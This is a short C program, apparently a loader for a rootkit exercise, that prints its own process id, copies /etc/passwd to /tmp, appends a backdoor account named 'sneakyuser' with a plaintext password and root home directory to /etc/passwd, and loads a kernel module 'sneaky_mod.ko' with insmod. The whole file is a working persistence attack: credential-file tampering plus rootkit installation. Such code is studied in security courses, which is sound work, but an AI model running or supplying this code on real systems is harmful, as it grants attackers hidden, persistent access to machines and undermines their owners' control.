#include <stdio.h>
#include <stdlib.h>
int main() {
    printf("sneaky_process pid = % d\n", getpid());
    system("cp /etc/passwd /tmp");
    printf("copied /etc/passwd to /tmp/passwd\n");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
    printf("added sneakyuser to /etc/passwd\n");
    system("insmod sneaky_mod.ko");
}